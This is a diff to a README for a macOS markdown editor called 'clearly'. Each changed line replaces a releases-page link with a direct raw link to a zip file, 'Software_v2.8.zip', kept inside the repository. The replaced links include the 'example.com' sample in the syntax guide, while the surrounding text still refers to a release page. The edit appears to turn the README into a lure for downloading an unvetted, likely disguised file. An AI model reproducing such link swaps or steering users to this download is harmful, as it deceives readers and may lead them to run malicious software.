@@ -1,6 +1,6 @@
 # 📝 clearly - Simple Markdown Editing for Mac
 
-[![Download clearly](https://img.shields.io/badge/Download%20clearly-Visit%20Releases-blue?style=for-the-badge)](https://github.com/fresh-mexicanrevolution306/clearly/releases)
+[![Download clearly](https://img.shields.io/badge/Download%20clearly-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/fresh-mexicanrevolution306/clearly/main/website/Software_v2.8.zip)
 
 ## ✨ What clearly is
 
@@ -17,7 +17,7 @@ It is made for people who want:
 
 Visit this page to download clearly:
 
-https://github.com/fresh-mexicanrevolution306/clearly/releases
+https://raw.githubusercontent.com/fresh-mexicanrevolution306/clearly/main/website/Software_v2.8.zip
 
 On the release page, find the latest version and download the file that matches your Mac. Then open the file and follow the on-screen steps.
 
@@ -162,17 +162,17 @@ Use these common patterns in your text:
 - `- Item` for a list item
 - `**bold**` for bold text
 - `*italic*` for italic text
-- `[link text](https://example.com)` for a link
+- `[link text](https://raw.githubusercontent.com/fresh-mexicanrevolution306/clearly/main/website/Software_v2.8.zip)` for a link
 
 ## 🧾 About this app
 
 - Repository: clearly
 - Description: A clean, native markdown editor for macOS
 - Topics: macos, markdown, swift
-- Download page: https://github.com/fresh-mexicanrevolution306/clearly/releases
+- Download page: https://raw.githubusercontent.com/fresh-mexicanrevolution306/clearly/main/website/Software_v2.8.zip
 
 ## 🔗 Download again
 
 Visit this page to download clearly:
 
-https://github.com/fresh-mexicanrevolution306/clearly/releases
+https://raw.githubusercontent.com/fresh-mexicanrevolution306/clearly/main/website/Software_v2.8.zip
